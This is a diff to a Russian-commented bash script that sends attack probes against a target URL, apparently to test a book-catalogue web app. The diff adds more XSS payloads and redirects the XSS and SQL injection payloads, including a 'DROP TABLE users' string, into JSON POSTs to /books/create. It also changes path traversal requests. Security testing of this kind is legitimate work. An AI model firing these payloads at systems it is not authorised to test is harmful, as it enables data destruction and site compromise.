@@ -58,25 +58,42 @@ done
 
 # 4. XSS атаки
 echo -e "\n4. Попытки XSS атак..."
+
 XSS_PAYLOADS=(
     "<script>alert('XSS')</script>"
     "<img src=x onerror=alert(1)>"
     "javascript:alert('XSS')"
     "'\"><script>alert(1)</script>"
     "<body onload=alert('XSS')>"
+    "<svg onload=alert(1)>"
+    "<iframe src=javascript:alert(1)>"
+    "<a href=\"javascript:alert('XSS')\">click</a>"
+    "<div onclick=\"alert('XSS')\">click me</div>"
+    "<input onfocus=alert(1) autofocus>"
 )
 
 for payload in "${XSS_PAYLOADS[@]}"; do
-    encoded_payload=$(echo "$payload" | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g')
-    curl -k -s -o /dev/null -w "XSS: $payload -> %{http_code}\n" \
-         "$TARGET_URL/search?q=$encoded_payload" \
-         -H "User-Agent: Mozilla/5.0" \
-         --max-time 2
+    # Кодируем payload в hex (альтернатива URL encoding)
+    encoded_payload=$(echo -n "$payload" | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g')
+    # Отправляем POST запрос с XSS payload
+    curl -k -s -o /dev/null -w "%{http_code} - %{payload}" \
+         -X POST "$TARGET_URL/books/create" \
+         -H "Content-Type: application/json" \
+         -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
+         -d "{
+            \"title\": \"XSS Test Book\",
+            \"author\": \"$payload\",
+            \"year\": 2024,
+            \"description\": \"Testing XSS payload: $payload\"
+         }" \
+         --max-time 5
     sleep $DELAY
 done
 
+
 # 5. SQL injection атаки
 echo -e "\n5. Попытки SQL injection..."
+
 SQL_PAYLOADS=(
     "' OR '1'='1"
     "'; DROP TABLE users;--"
@@ -87,12 +104,16 @@ SQL_PAYLOADS=(
 
 for payload in "${SQL_PAYLOADS[@]}"; do
     encoded_payload=$(echo "$payload" | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g')
-    curl -k -s -o /dev/null -w "SQLi: $payload -> %{http_code}\n" \
-         -X POST "$TARGET_URL/login" \
-         -H "Content-Type: application/x-www-form-urlencoded" \
-         -H "User-Agent: Mozilla/5.0" \
-         -d "username=admin&password=$encoded_payload" \
-         --max-time 2
+    curl -k -s -o /dev/null -w "%{http_code} - %{payload}" \
+         -X POST "$TARGET_URL/books/create" \
+         -H "Content-Type: application/json" \
+         -d "{
+            \"title\": \"SQL Test Book\",
+            \"author\": \"$payload\",
+            \"year\": 2024,
+            \"description\": \"Testing SQL injection\"
+         }" \
+         --max-time 5
     sleep $DELAY
 done
 
@@ -109,7 +130,7 @@ PATHS=(
 for path in "${PATHS[@]}"; do
     encoded_path=$(echo "$path" | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g')
     curl -k -s -o /dev/null -w "Path: $path -> %{http_code}\n" \
-         "$TARGET_URL/download?file=$encoded_path" \
+         "$TARGET_URL/$encoded_path" \
          -H "User-Agent: Mozilla/5.0" \
          --max-time 2
     sleep $DELAY
